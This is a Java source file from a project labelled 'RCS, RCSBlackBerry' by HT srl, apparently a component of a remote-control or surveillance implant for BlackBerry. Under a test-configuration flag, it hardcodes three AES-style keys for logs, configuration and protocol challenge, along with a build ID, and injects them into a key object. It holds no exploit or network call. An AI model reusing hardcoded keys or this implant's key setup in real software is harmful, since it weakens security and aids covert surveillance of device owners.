//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.config
 * File         : InstanceKeys323.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.config;

/**
 * The Class InstanceKeys323.
 */

public final class InstanceKeysFake implements InstanceKeysEmbedded {
    //#ifdef FAKECONF
 // RCS 14
    byte[] LogKey = new byte[]{ (byte)0x83, (byte)0x05, (byte)0x88, (byte)0xb9, (byte)0x5d, (byte)0x8a, (byte)0x4e, (byte)0xf7, (byte)0xc5, (byte)0x3e, (byte)0xe0, (byte)0xd3, (byte)0x90, (byte)0xda, (byte)0x2d, (byte)0xa9 };

    byte[] ConfKey = new byte[] { (byte)0xf8, (byte)0xca, (byte)0x17, (byte)0xe2, (byte)0x12, (byte)0xba, (byte)0x63, (byte)0xe3, (byte)0x68, (byte)0x47, (byte)0x86, (byte)0x31, (byte)0x35, (byte)0xd4, (byte)0x01, (byte)0x46 };

    byte[] ProtoKey = new byte[]{ (byte)0x70, (byte)0xf7, (byte)0x1c, (byte)0x69, (byte)0x25, (byte)0x16, (byte)0x52, (byte)0x8c, (byte)0x73, (byte)0x7a, (byte)0xb1, (byte)0x5f, (byte)0xa9, (byte)0x16, (byte)0xac, (byte)0x69 };
    /**
     * Inject keysFake.
     */
    public void injectKeys(InstanceKeys keys) {
        keys.setAesKey(LogKey);
        keys.setChallengeKey(ProtoKey);
        keys.setBuildID("RCS_0000000014");
        keys.setConfKey(ConfKey);
    }

    public InstanceKeysFake() {
    }

    //#else
    public void injectKeys(InstanceKeys keys) {
    }
    //#endif
}
